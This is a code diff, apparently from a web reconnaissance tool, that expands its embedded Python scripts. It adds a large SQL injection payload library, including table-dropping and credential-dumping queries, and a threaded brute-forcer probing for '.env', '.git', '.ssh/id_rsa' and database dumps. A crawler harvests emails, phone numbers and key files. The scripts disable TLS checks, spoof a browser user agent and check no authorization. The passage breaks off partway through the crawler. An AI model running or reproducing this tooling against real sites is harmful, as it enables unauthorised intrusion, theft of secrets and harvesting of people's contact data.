@@ -1782,6 +1782,93 @@ if body:
         }
         results['extraction']['financial'] = financial
 
+    # --- Deep credential-free extraction (always runs) ---
+
+    # Extract page metadata
+    meta_data = {}
+    title_m = re.search(r'<title[^>]*>(.*?)</title>', body, re.IGNORECASE | re.DOTALL)
+    if title_m: meta_data['title'] = title_m.group(1).strip()[:200]
+    for meta_tag in re.findall(r'<meta\\s+([^>]+)/?>', body, re.IGNORECASE):
+        name_m = re.search(r'(?:name|property)=["\\'](.*?)["\\'\\s]', meta_tag, re.IGNORECASE)
+        content_m = re.search(r'content=["\\'](.*?)["\\'\\s]', meta_tag, re.IGNORECASE)
+        if name_m and content_m:
+            meta_data[name_m.group(1)] = content_m.group(1)[:300]
+    results['extraction']['metadata'] = meta_data
+
+    # Extract social media links and profiles
+    social_patterns = {
+        'twitter': r'(?:https?://)?(?:www\\.)?(?:twitter\\.com|x\\.com)/([A-Za-z0-9_]+)',
+        'facebook': r'(?:https?://)?(?:www\\.)?facebook\\.com/([A-Za-z0-9._-]+)',
+        'instagram': r'(?:https?://)?(?:www\\.)?instagram\\.com/([A-Za-z0-9._]+)',
+        'linkedin': r'(?:https?://)?(?:www\\.)?linkedin\\.com/(?:in|company)/([A-Za-z0-9_-]+)',
+        'youtube': r'(?:https?://)?(?:www\\.)?youtube\\.com/(?:@|channel/|user/)([A-Za-z0-9_-]+)',
+        'github': r'(?:https?://)?(?:www\\.)?github\\.com/([A-Za-z0-9_-]+)',
+        'tiktok': r'(?:https?://)?(?:www\\.)?tiktok\\.com/@([A-Za-z0-9._]+)',
+        'pinterest': r'(?:https?://)?(?:www\\.)?pinterest\\.com/([A-Za-z0-9_-]+)',
+    }
+    social_links = {}
+    for platform, pattern in social_patterns.items():
+        matches = list(set(re.findall(pattern, body, re.IGNORECASE)))
+        if matches:
+            social_links[platform] = matches[:5]
+    results['extraction']['social_links'] = social_links
+
+    # Extract all internal links for sitemap
+    internal_links = set()
+    external_links = set()
+    for href in re.findall(r'href=["\\'](.*?)["\\'\\s]', body, re.IGNORECASE):
+        if href.startswith('#') or href.startswith('javascript:') or href.startswith('mailto:'):
+            continue
+        if href.startswith('/') or href.startswith(target):
+            internal_links.add(href[:200])
+        elif href.startswith('http'):
+            external_links.add(href[:200])
+    results['extraction']['internal_links'] = sorted(internal_links)[:100]
+    results['extraction']['external_links'] = sorted(external_links)[:50]
+
+    # Extract JavaScript sources (may reveal API endpoints)
+    js_sources = list(set(re.findall(r'src=["\\'](.*?\\.js(?:\\?[^"\\']*)?)["\\'\\s]', body, re.IGNORECASE)))
+    results['extraction']['javascript_sources'] = js_sources[:30]
+
+    # Extract inline script content for API endpoints
+    api_endpoints = set()
+    for script_block in re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE):
+        for ep in re.findall(r'["\\'](/api/[a-zA-Z0-9/_-]+)["\\'\\s]', script_block):
+            api_endpoints.add(ep)
+        for ep in re.findall(r'["\\'](https?://[^"\\'>\\s]+/api/[^"\\'>\\s]*)["\\'\\s]', script_block):
+            api_endpoints.add(ep[:200])
+    results['extraction']['api_endpoints'] = sorted(api_endpoints)[:30]
+
+    # Crawl key subpages to extract additional data (no credentials needed)
+    subpage_data = {}
+    crawl_targets = list(internal_links)[:10]
+    for link in crawl_targets:
+        try:
+            if link.startswith('/'):
+                full_url = target.rstrip('/') + link
+            else:
+                full_url = link
+            sub_req = urllib.request.Request(full_url, headers={'User-Agent': ua})
+            sub_resp = urllib.request.urlopen(sub_req, timeout=5, context=ctx)
+            sub_body = sub_resp.read().decode('utf-8', errors='ignore')
+            sub_emails = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}', sub_body)))
+            sub_phones = list(set(re.findall(r'\\b(?:\\+?1[-.]?)?\\(?\\d{3}\\)?[-.]?\\d{3}[-.]?\\d{4}\\b', sub_body)))
+            sub_data = {'status': sub_resp.status, 'size': len(sub_body)}
+            if sub_emails: sub_data['emails'] = sub_emails[:10]
+            if sub_phones: sub_data['phones'] = sub_phones[:10]
+            # Also extract social links from subpages
+            for platform, pattern in social_patterns.items():
+                matches = list(set(re.findall(pattern, sub_body, re.IGNORECASE)))
+                if matches:
+                    if platform not in social_links:
+                        social_links[platform] = []
+                    social_links[platform] = list(set(social_links.get(platform, []) + matches))[:5]
+            subpage_data[link] = sub_data
+        except:
+            pass
+    results['extraction']['subpage_crawl'] = subpage_data
+    results['extraction']['social_links'] = social_links  # Update with subpage findings
+
 json.dump(results, open(output, 'w'), indent=2, default=str)
 summary = {
     'found_paths': len([p for p in results['recon'].get('paths', {}) if results['recon']['paths'][p].get('status') == 200]),
@@ -1805,47 +1892,186 @@ print(json.dumps(summary))
           case 'sql-injection': {
             progress(progressCh, 10, 'Testing for SQL injection vulnerabilities...');
             const sqliScript = `
-import urllib.request, urllib.error, json, sys, ssl
-from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
+import urllib.request, urllib.error, json, sys, ssl, re, time
+from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, urljoin
 
 target = sys.argv[1]
 output = sys.argv[2]
 ctx = ssl.create_default_context()
 ctx.check_hostname = False
 ctx.verify_mode = ssl.CERT_NONE
+ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
 
-payloads = ["'", "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE--", "1 UNION SELECT NULL--",
-    "' AND '1'='1", "1' ORDER BY 1--", "' UNION SELECT 1,2,3--"]
+# --- Comprehensive SQLi payload library ---
+error_based = [
+    "'", "''", "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
+    "' OR 1=1--", "' OR 1=1#", "') OR ('1'='1", "') OR 1=1--",
+    "'; DROP TABLE users--", "1' ORDER BY 1--", "1' ORDER BY 10--",
+    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--",
+    "' UNION SELECT 1,2,3,4--", "' UNION SELECT 1,2,3,4,5--",
+    "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1", "1' AND '1'='2",
+    "admin'--", "admin' #", "admin'/*", "' HAVING 1=1--",
+    "' GROUP BY columnnames HAVING 1=1--",
+    "1 UNION ALL SELECT 1,2,3,4,5,6,table_name FROM information_schema.tables--",
+    "1 UNION SELECT username,password FROM users--",
+]
+blind_boolean = [
+    "' AND 1=1--", "' AND 1=2--",
+    "' AND SUBSTRING(@@version,1,1)='5'--",
+    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+    "1 AND 1=1", "1 AND 1=2",
+    "' OR EXISTS(SELECT * FROM users)--",
+    "' AND LENGTH(database())>0--",
+]
+time_based = [
+    "'; WAITFOR DELAY '0:0:3'--",
+    "' OR SLEEP(3)--",
+    "1; WAITFOR DELAY '0:0:3'--",
+    "' AND SLEEP(3) AND '1'='1",
+    "1 AND BENCHMARK(5000000,SHA1('test'))",
+    "' OR pg_sleep(3)--",
+]
+header_payloads = [
+    ("X-Forwarded-For", "' OR 1=1--"),
+    ("Referer", "' OR 1=1--"),
+    ("User-Agent", "' OR 1=1--"),
+    ("Cookie", "session=' OR 1=1--"),
+]
 
-results = {'target': target, 'tests': []}
+# SQL error signatures for detection
+error_signatures = [
+    'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite', 'microsoft sql',
+    'unclosed quotation', 'quoted string not properly terminated',
+    'you have an error in your sql', 'syntax error', 'pg_query',
+    'supplied argument is not a valid', 'mysql_fetch', 'mysqli_',
+    'pg_exec', 'odbc_', 'ora-\\d{5}', 'db2_', 'sybase',
+    'jdbc', 'sqlstate', 'warning.*mysql', 'valid mysql result',
+    'dynamic sql error', 'microsoft ole db provider for sql server',
+    'sqlserver', 'access database engine', 'jet database engine',
+    'unterminated', 'division by zero', 'conversion failed',
+    'data type mismatch', 'invalid column', 'unknown column',
+    'table.*doesn.t exist', 'column.*does not exist',
+]
+
+results = {'target': target, 'tests': [], 'blind_tests': [], 'time_tests': [], 'header_tests': []}
 parsed = urlparse(target)
 params = parse_qs(parsed.query)
 
+def check_sqli(response_body):
+    body_lower = response_body.lower()
+    for sig in error_signatures:
+        if re.search(sig, body_lower):
+            return True, sig
+    return False, None
+
+# Get baseline response
+baseline_length = 0
+baseline_body = ''
+try:
+    req = urllib.request.Request(target, headers={'User-Agent': ua})
+    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+    baseline_body = resp.read().decode('utf-8', errors='ignore')
+    baseline_length = len(baseline_body)
+except: pass
+
+# Error-based SQLi
 for param_name in params:
-    for payload in payloads:
+    for payload in error_based:
         test_params = dict(params)
         test_params[param_name] = [payload]
         test_query = urlencode(test_params, doseq=True)
         test_url = urlunparse(parsed._replace(query=test_query))
         try:
-            req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
+            req = urllib.request.Request(test_url, headers={'User-Agent': ua})
             resp = urllib.request.urlopen(req, timeout=10, context=ctx)
             body = resp.read().decode('utf-8', errors='ignore')
-            indicators = ['sql', 'syntax', 'mysql', 'postgresql', 'oracle', 'sqlite', 'error']
-            suspicious = any(ind in body.lower() for ind in indicators)
-            results['tests'].append({
-                'param': param_name, 'payload': payload,
-                'status': resp.status, 'suspicious': suspicious,
-                'length': len(body)
+            suspicious, matched_sig = check_sqli(body)
+            entry = {
+                'param': param_name, 'payload': payload, 'type': 'error-based',
+                'status': resp.status, 'suspicious': suspicious, 'length': len(body),
+                'length_diff': abs(len(body) - baseline_length),
+            }
+            if matched_sig: entry['matched_signature'] = matched_sig
+            results['tests'].append(entry)
+        except urllib.error.HTTPError as e:
+            results['tests'].append({'param': param_name, 'payload': payload, 'type': 'error-based', 'status': e.code})
+        except: pass
+
+    # Blind boolean-based tests
+    for payload in blind_boolean:
+        test_params = dict(params)
+        test_params[param_name] = [payload]
+        test_query = urlencode(test_params, doseq=True)
+        test_url = urlunparse(parsed._replace(query=test_query))
+        try:
+            req = urllib.request.Request(test_url, headers={'User-Agent': ua})
+            resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+            body = resp.read().decode('utf-8', errors='ignore')
+            results['blind_tests'].append({
+                'param': param_name, 'payload': payload, 'type': 'blind-boolean',
+                'status': resp.status, 'length': len(body),
+                'length_diff': abs(len(body) - baseline_length),
+                'differs_from_baseline': abs(len(body) - baseline_length) > 50,
             })
         except urllib.error.HTTPError as e:
-            results['tests'].append({'param': param_name, 'payload': payload, 'status': e.code})
-        except:
-            pass
+            results['blind_tests'].append({'param': param_name, 'payload': payload, 'type': 'blind-boolean', 'status': e.code})
+        except: pass
 
-results['vulnerable_indicators'] = len([t for t in results['tests'] if t.get('suspicious')])
+    # Time-based blind tests (only test first 2 to avoid long waits)
+    for payload in time_based[:2]:
+        test_params = dict(params)
+        test_params[param_name] = [payload]
+        test_query = urlencode(test_params, doseq=True)
+        test_url = urlunparse(parsed._replace(query=test_query))
+        try:
+            start_time = time.time()
+            req = urllib.request.Request(test_url, headers={'User-Agent': ua})
+            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
+            elapsed = time.time() - start_time
+            body = resp.read().decode('utf-8', errors='ignore')
+            results['time_tests'].append({
+                'param': param_name, 'payload': payload, 'type': 'time-based',
+                'status': resp.status, 'response_time': round(elapsed, 2),
+                'suspicious': elapsed > 2.5,
+            })
+        except: pass
+
+# Header injection tests
+for header_name, payload in header_payloads:
+    try:
+        headers = {'User-Agent': ua, header_name: payload}
+        req = urllib.request.Request(target, headers=headers)
+        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+        body = resp.read().decode('utf-8', errors='ignore')
+        suspicious, matched_sig = check_sqli(body)
+        entry = {
+            'header': header_name, 'payload': payload, 'type': 'header-injection',
+            'status': resp.status, 'suspicious': suspicious,
+        }
+        if matched_sig: entry['matched_signature'] = matched_sig
+        results['header_tests'].append(entry)
+    except: pass
+
+# Also scan for injectable form inputs by crawling the page
+if baseline_body:
+    forms = re.findall(r'<form[^>]*action=["\\'](.*?)["\\'](.*?)</form>', baseline_body, re.DOTALL | re.IGNORECASE)
+    input_names = re.findall(r'<input[^>]*name=["\\'](.*?)["\\'\\s]', baseline_body, re.IGNORECASE)
+    results['discovered_inputs'] = {
+        'form_count': len(forms),
+        'form_actions': [f[0] for f in forms[:10]],
+        'input_fields': list(set(input_names))[:20],
+    }
+
+results['summary'] = {
+    'error_based_suspicious': len([t for t in results['tests'] if t.get('suspicious')]),
+    'blind_anomalies': len([t for t in results['blind_tests'] if t.get('differs_from_baseline')]),
+    'time_based_suspicious': len([t for t in results['time_tests'] if t.get('suspicious')]),
+    'header_suspicious': len([t for t in results['header_tests'] if t.get('suspicious')]),
+    'total_tests': len(results['tests']) + len(results['blind_tests']) + len(results['time_tests']) + len(results['header_tests']),
+}
 json.dump(results, open(output, 'w'), indent=2)
-print(json.dumps({'tests_run': len(results['tests']), 'suspicious': results['vulnerable_indicators']}))
+print(json.dumps(results['summary']))
 `;
             const scriptPath = path.join(outputPath, '_sqli_test.py');
             const resultPath = path.join(outputPath, 'sqli_results.json');
@@ -1859,42 +2085,157 @@ print(json.dumps({'tests_run': len(results['tests']), 'suspicious': results['vul
           case 'directory-traverse': {
             progress(progressCh, 10, 'Enumerating directories...');
             const dirScript = `
-import urllib.request, urllib.error, json, sys, ssl
+import urllib.request, urllib.error, json, sys, ssl, re, os
+from urllib.parse import urlparse, urljoin
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 target = sys.argv[1].rstrip('/')
 output = sys.argv[2]
 ctx = ssl.create_default_context()
 ctx.check_hostname = False
 ctx.verify_mode = ssl.CERT_NONE
+ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
 
-wordlist = [
-    'admin', 'administrator', 'login', 'wp-admin', 'dashboard', 'api', 'v1', 'v2',
-    'backup', 'backups', 'db', 'database', 'config', 'conf', 'test', 'dev', 'staging',
-    'old', 'new', 'tmp', 'temp', 'private', 'secret', 'hidden', 'upload', 'uploads',
-    'files', 'docs', 'documents', 'images', 'static', 'assets', 'css', 'js', 'scripts',
-    'cgi-bin', 'bin', 'includes', 'inc', 'lib', 'vendor', 'node_modules', '.git',
-    '.svn', '.env', '.htaccess', 'robots.txt', 'sitemap.xml', 'crossdomain.xml',
-    'phpinfo.php', 'info.php', 'server-status', 'server-info', 'wp-config.php.bak',
-    'console', 'shell', 'cmd', 'debug', 'trace', 'log', 'logs', 'error_log',
-    'phpmyadmin', 'adminer', 'webmail', 'mail', 'cpanel', 'plesk'
+# --- Comprehensive directory & file wordlist ---
+dirs = [
+    # Admin panels
+    'admin', 'administrator', 'admin1', 'admin2', 'adminpanel', 'admin-panel',
+    'admin_area', 'admin-area', 'siteadmin', 'site-admin', 'webadmin',
+    'controlpanel', 'cpanel', 'panel', 'manage', 'manager', 'management',
+    'wp-admin', 'wp-login.php', 'login', 'signin', 'auth', 'authenticate',
+    'dashboard', 'portal', 'backend', 'cms',
+    # API endpoints
+    'api', 'api/v1', 'api/v2', 'api/v3', 'api/v4', 'rest', 'graphql',
+    'api/docs', 'api/swagger', 'api/health', 'api/status', 'api/config',
+    'api/users', 'api/admin', 'api/login', 'api/auth', 'api/token',
+    'api/data', 'api/export', 'api/import', 'api/upload', 'api/download',
+    'swagger', 'swagger-ui', 'swagger.json', 'swagger.yaml',
+    'openapi', 'openapi.json', 'openapi.yaml', 'redoc',
+    # Version control
+    '.git', '.git/HEAD', '.git/config', '.git/index', '.git/logs/HEAD',
+    '.gitignore', '.gitattributes',
+    '.svn', '.svn/entries', '.svn/wc.db',
+    '.hg', '.hgignore', '.bzr',
+    # CI/CD & Config
+    '.env', '.env.local', '.env.production', '.env.development', '.env.staging',
+    '.env.backup', '.env.bak', '.env.old', '.env.save', '.env.example',
+    '.htaccess', '.htpasswd', 'web.config', 'wp-config.php', 'wp-config.php.bak',
+    'wp-config.php.old', 'wp-config.php.save', 'wp-config.php.swp',
+    'config.php', 'config.yml', 'config.yaml', 'config.json', 'config.xml',
+    'configuration.php', 'settings.php', 'settings.py', 'settings.json',
+    'database.yml', 'database.json', 'db.php', 'db.json',
+    'Dockerfile', 'docker-compose.yml', 'docker-compose.yaml',
+    '.dockerignore', 'Vagrantfile', 'Makefile', 'Rakefile',
+    'Jenkinsfile', '.travis.yml', '.circleci/config.yml', '.gitlab-ci.yml',
+    'package.json', 'composer.json', 'Gemfile', 'requirements.txt',
+    'yarn.lock', 'package-lock.json', 'composer.lock',
+    # Backup & data files
+    'backup', 'backups', 'bak', 'old', 'temp', 'tmp', 'cache',
+    'dump', 'dump.sql', 'database.sql', 'db.sql', 'data.sql',
+    'backup.sql', 'backup.zip', 'backup.tar.gz', 'backup.tar',
+    'site.zip', 'www.zip', 'html.zip', 'web.zip',
+    'db_backup', 'sql', 'mysql', 'data', 'export',
+    # Server info
+    'phpinfo.php', 'info.php', 'test.php', 'check.php', 'health',
+    'server-status', 'server-info', 'status', 'health-check', 'ping',
+    'debug', 'debug.log', 'trace', 'trace.axd', 'elmah.axd',
+    'console', 'shell', 'terminal', 'cmd',
+    # Common apps
+    'phpmyadmin', 'pma', 'myadmin', 'mysql-admin', 'adminer', 'adminer.php',
+    'webmail', 'mail', 'roundcube', 'squirrelmail', 'horde',
+    'plesk', 'whm', 'cPanel',
+    # Upload/file directories
+    'upload', 'uploads', 'files', 'media', 'attachments', 'documents',
+    'docs', 'doc', 'images', 'img', 'pictures', 'photos', 'downloads',
+    'assets', 'static', 'public', 'resources', 'content',
+    'wp-content', 'wp-includes', 'wp-content/uploads',
+    # Development
+    'test', 'tests', 'testing', 'dev', 'development', 'staging',
+    'stage', 'demo', 'beta', 'alpha', 'sandbox', 'preview',
+    'debug', 'logs', 'log', 'error_log', 'access_log',
+    'cgi-bin', 'bin', 'includes', 'inc', 'lib', 'src',
+    'vendor', 'node_modules', 'bower_components',
+    # Security
+    'robots.txt', 'sitemap.xml', 'sitemap_index.xml', 'crossdomain.xml',
+    '.well-known', '.well-known/security.txt', '.well-known/openid-configuration',
+    '.well-known/change-password', '.well-known/apple-app-site-association',
+    'security.txt', 'humans.txt', 'ads.txt',
+    # Hidden & sensitive
+    'private', 'secret', 'secrets', 'hidden', 'internal',
+    'confidential', 'restricted', 'secure', 'protected',
+    '.DS_Store', 'Thumbs.db', 'desktop.ini',
+    '.bash_history', '.ssh', '.ssh/id_rsa', '.ssh/id_rsa.pub',
+    'id_rsa', 'id_dsa', '.npmrc', '.pypirc',
+    # Misc
+    'readme', 'README.md', 'README.txt', 'CHANGELOG', 'CHANGELOG.md',
+    'LICENSE', 'LICENSE.txt', 'INSTALL', 'CONTRIBUTING.md',
+    'cron', 'crontab', 'scripts', 'tools', 'utilities',
+    'invoker', 'invokers', 'install', 'setup', 'init',
 ]
 
-results = {'target': target, 'found': [], 'tested': 0}
-for word in wordlist:
+# Remove duplicates
+dirs = list(dict.fromkeys(dirs))
+
+results = {'target': target, 'found': [], 'tested': 0, 'errors': 0, 'interesting': []}
+
+def test_path(word):
     url = f"{target}/{word}"
-    results['tested'] += 1
     try:
-        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+        req = urllib.request.Request(url, headers={'User-Agent': ua}, method='GET')
         resp = urllib.request.urlopen(req, timeout=5, context=ctx)
-        results['found'].append({'path': f"/{word}", 'status': resp.status, 'size': len(resp.read())})
+        content = resp.read()
+        content_type = resp.headers.get('Content-Type', '')
+        entry = {
+            'path': f"/{word}", 'status': resp.status,
+            'size': len(content), 'content_type': content_type,
+        }
+        # Check for directory listing
+        if b'Index of' in content or b'Directory listing' in content:
+            entry['directory_listing'] = True
+        # Check for sensitive content indicators
+        text = content.decode('utf-8', errors='ignore')[:2000]
+        if any(k in text.lower() for k in ['password', 'secret', 'api_key', 'token', 'private_key', 'credential']):
+            entry['contains_sensitive'] = True
+        # Preview first 200 chars for interesting files
+        if word.endswith(('.txt', '.json', '.xml', '.yml', '.yaml', '.env', '.php', '.log')):
+            entry['preview'] = text[:200]
+        return ('found', entry)
     except urllib.error.HTTPError as e:
-        if e.code not in [404, 403]:
-            results['found'].append({'path': f"/{word}", 'status': e.code})
+        if e.code == 403:
+            return ('found', {'path': f"/{word}", 'status': 403, 'note': 'Forbidden - exists but access denied'})
+        elif e.code not in [404]:
+            return ('found', {'path': f"/{word}", 'status': e.code})
+        return ('not_found', None)
     except:
-        pass
+        return ('error', None)
+
+# Thread pool for fast enumeration
+with ThreadPoolExecutor(max_workers=15) as executor:
+    futures = {executor.submit(test_path, word): word for word in dirs}
+    for future in as_completed(futures):
+        results['tested'] += 1
+        try:
+            status, entry = future.result()
+            if status == 'found' and entry:
+                results['found'].append(entry)
+                if entry.get('directory_listing') or entry.get('contains_sensitive'):
+                    results['interesting'].append(entry)
+            elif status == 'error':
+                results['errors'] += 1
+        except: pass
+
+# Sort results by status
+results['found'].sort(key=lambda x: x.get('status', 999))
+results['summary'] = {
+    'total_tested': results['tested'],
+    'total_found': len(results['found']),
+    'accessible_200': len([f for f in results['found'] if f.get('status') == 200]),
+    'forbidden_403': len([f for f in results['found'] if f.get('status') == 403]),
+    'interesting': len(results['interesting']),
+}
 
 json.dump(results, open(output, 'w'), indent=2)
-print(json.dumps({'tested': results['tested'], 'found': len(results['found'])}))
+print(json.dumps(results['summary']))
 `;
             const scriptPath = path.join(outputPath, '_dir_enum.py');
             const resultPath = path.join(outputPath, 'directory_results.json');
@@ -1926,17 +2267,97 @@ print(json.dumps({'tested': results['tested'], 'found': len(results['found'])}))
       const python = await resolveTool('python');
       if (!python.found) return { success: false, error: 'Python required' };
       const scanScript = `
-import urllib.request, ssl, json, sys
+import urllib.request, ssl, json, sys, socket, re
+
 ctx = ssl.create_default_context()
 ctx.check_hostname = False
 ctx.verify_mode = ssl.CERT_NONE
 target = sys.argv[1]
+results = {'reachable': False}
 try:
-    req = urllib.request.Request(target, headers={"User-Agent": "Mozilla/5.0"})
+    from urllib.parse import urlparse
+    parsed = urlparse(target)
+    host = parsed.hostname
+
+    # DNS resolution
+    try:
+        ips = socket.getaddrinfo(host, None)
+        results['ips'] = list(set([ip[4][0] for ip in ips]))[:5]
+    except: pass
+
+    # HTTP request with full header capture
+    req = urllib.request.Request(target, headers={
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    })
     resp = urllib.request.urlopen(req, timeout=10, context=ctx)
-    print(json.dumps({"reachable": True, "status": resp.status, "server": resp.headers.get("Server", "")}))
+    body = resp.read().decode('utf-8', errors='ignore')
+    results['reachable'] = True
+    results['status'] = resp.status
+    results['server'] = resp.headers.get('Server', '')
+    results['powered_by'] = resp.headers.get('X-Powered-By', '')
+    results['content_type'] = resp.headers.get('Content-Type', '')
+    results['content_length'] = len(body)
+
+    # Security headers check
+    security_headers = {}
+    for h in ['X-Frame-Options', 'X-Content-Type-Options', 'X-XSS-Protection',
+              'Strict-Transport-Security', 'Content-Security-Policy',
+              'Referrer-Policy', 'Permissions-Policy', 'Cross-Origin-Opener-Policy']:
+        val = resp.headers.get(h)
+        if val: security_headers[h] = val
+    results['security_headers'] = security_headers
+    results['missing_security_headers'] = [h for h in ['X-Frame-Options', 'X-Content-Type-Options',
+        'Strict-Transport-Security', 'Content-Security-Policy'] if h not in security_headers]
+
+    # Technology fingerprinting
+    techs = []
+    if 'wp-content' in body or 'wp-includes' in body: techs.append('WordPress')
+    if 'drupal' in body.lower(): techs.append('Drupal')
+    if 'joomla' in body.lower(): techs.append('Joomla')
+    if '__NEXT_DATA__' in body: techs.append('Next.js')
+    if '_nuxt' in body: techs.append('Nuxt.js')
+    if 'react' in body.lower(): techs.append('React')
+    if 'angular' in body.lower(): techs.append('Angular')
+    if 'vue' in body.lower(): techs.append('Vue.js')
+    if 'laravel' in body.lower(): techs.append('Laravel')
+    if 'django' in body.lower(): techs.append('Django')
+    if 'flask' in body.lower(): techs.append('Flask')
+    if 'express' in str(results.get('powered_by', '')).lower(): techs.append('Express.js')
+    if 'shopify' in body.lower(): techs.append('Shopify')
+    if 'woocommerce' in body.lower(): techs.append('WooCommerce')
+    if 'cloudflare' in str(resp.headers).lower(): techs.append('Cloudflare')
+    if 'amazonaws' in str(resp.headers).lower(): techs.append('AWS')
+    results['technologies'] = techs
+
+    # Page title
+    title_m = re.search(r'<title[^>]*>(.*?)</title>', body, re.IGNORECASE | re.DOTALL)
+    if title_m: results['title'] = title_m.group(1).strip()[:200]
+
+    # Count forms and inputs
+    results['form_count'] = len(re.findall(r'<form', body, re.IGNORECASE))
+    results['input_count'] = len(re.findall(r'<input', body, re.IGNORECASE))
+    results['link_count'] = len(re.findall(r'<a\\s', body, re.IGNORECASE))
+
+    # SSL cert info
+    if parsed.scheme == 'https':
+        try:
+            import ssl as ssl_mod
+            conn_ctx = ssl_mod.create_default_context()
+            with socket.create_connection((host, 443), timeout=5) as sock:
+                with conn_ctx.wrap_socket(sock, server_hostname=host) as ssock:
+                    cert = ssock.getpeercert()
+                    results['ssl'] = {
+                        'issuer': dict(x[0] for x in cert.get('issuer', [])).get('organizationName', ''),
+                        'expires': cert.get('notAfter', ''),
+                        'subject': dict(x[0] for x in cert.get('subject', [])).get('commonName', ''),
+                    }
+        except: pass
+
+    print(json.dumps(results))
 except Exception as e:
-    print(json.dumps({"reachable": False, "error": str(e)}))
+    results['error'] = str(e)
+    print(json.dumps(results))
 `;
       const scriptPath = path.join(require('os').tmpdir(), `_scan_${Date.now()}.py`);
       await fs.writeFile(scriptPath, scanScript, 'utf-8');
@@ -1987,9 +2408,10 @@ except Exception as e:
           // Fallback: run an inline crawler script if photon module is not installed
           progress(progressCh, 15, 'Photon module not found, using built-in crawler...');
           const crawlerScript = `
-import urllib.request, urllib.error, json, sys, ssl, re, os
-from urllib.parse import urlparse, urljoin
+import urllib.request, urllib.error, json, sys, ssl, re, os, hashlib, time
+from urllib.parse import urlparse, urljoin, quote
 from collections import defaultdict
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 target = sys.argv[1]
 output_dir = sys.argv[2]
@@ -1997,86 +2419,224 @@ max_depth = int(sys.argv[3])
 ctx = ssl.create_default_context()
 ctx.check_hostname = False
 ctx.verify_mode = ssl.CERT_NONE
+ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
 
 visited = set()
 results = defaultdict(set)
 parsed_target = urlparse(target)
 base_domain = parsed_target.hostname
+page_metadata = {}
 
-def crawl(url, depth=0):
-    if depth > max_depth or url in visited or len(visited) > 200:
-        return
-    visited.add(url)
+def fetch_page(url):
     try:
-        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (compatible; Photon/RMPG)'})
+        req = urllib.request.Request(url, headers={
+            'User-Agent': ua,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+        })
         resp = urllib.request.urlopen(req, timeout=10, context=ctx)
         body = resp.read().decode('utf-8', errors='ignore')
+        return body, resp.status, dict(resp.headers)
     except:
-        return
+        return None, 0, {}
 
-    # Extract emails
+def extract_from_page(url, body, headers):
+    # Emails
     emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}', body))
     results['emails'].update(emails)
 
-    # Extract URLs
+    # Phone numbers
+    phones = set(re.findall(r'(?:\\+?1[-.]?)?\\(?\\d{3}\\)?[-.]?\\d{3}[-.]?\\d{4}', body))
+    results['phones'].update(phones)
+
+    # URLs (href and src)
     urls = set(re.findall(r'href=["\\'](https?://[^"\\'>]+)', body))
     urls.update(re.findall(r'src=["\\'](https?://[^"\\'>]+)', body))
     for u in urls:
         results['urls'].add(u)
-        parsed = urlparse(u)
-        if parsed.hostname == base_domain and u not in visited:
-            crawl(u, depth + 1)
 
-    # Extract internal paths
+    # Internal paths
     internal = set(re.findall(r'href=["\\'](/[^"\\'>]+)', body))
+    internal.update(re.findall(r'href=["\\'](\\./[^"\\'>]+)', body))
     for p in internal:
         full = urljoin(target, p)
         results['internal'].add(full)
-        if full not in visited:
-            crawl(full, depth + 1)
 
-    # Extract social media links
-    social_patterns = ['facebook.com', 'twitter.com', 'linkedin.com', 'instagram.com', 'github.com', 'youtube.com']
+    # Social media
+    social_patterns = {
+        'facebook.com': 'Facebook', 'twitter.com': 'Twitter', 'x.com': 'Twitter',
+        'linkedin.com': 'LinkedIn', 'instagram.com': 'Instagram',
+        'github.com': 'GitHub', 'youtube.com': 'YouTube', 'tiktok.com': 'TikTok',
+        'pinterest.com': 'Pinterest', 'reddit.com': 'Reddit',
+    }
     for u in urls:
-        for sp in social_patterns:
-            if sp in u:
+        for domain, platform in social_patterns.items():
+            if domain in u:
                 results['social'].add(u)
 
-    # Extract files
-    file_exts = ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.csv', '.zip', '.sql', '.bak', '.conf', '.env', '.json', '.xml']
-    for u in urls | {urljoin(target, p) for p in internal}:
+    # Files & documents
+    file_exts = ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.csv', '.zip', '.tar', '.gz',
+                 '.sql', '.bak', '.conf', '.env', '.json', '.xml', '.yaml', '.yml',
+                 '.log', '.txt', '.pem', '.key', '.cert', '.p12', '.pfx', '.jks',
+                 '.sqlite', '.db', '.mdb', '.accdb', '.backup', '.dump', '.swp']
+    all_links = urls | {urljoin(target, p) for p in internal}
+    for u in all_links:
         for ext in file_exts:
-            if u.lower().endswith(ext):
+            if u.lower().endswith(ext) or f'{ext}?' in u.lower():
                 results['files'].add(u)
 
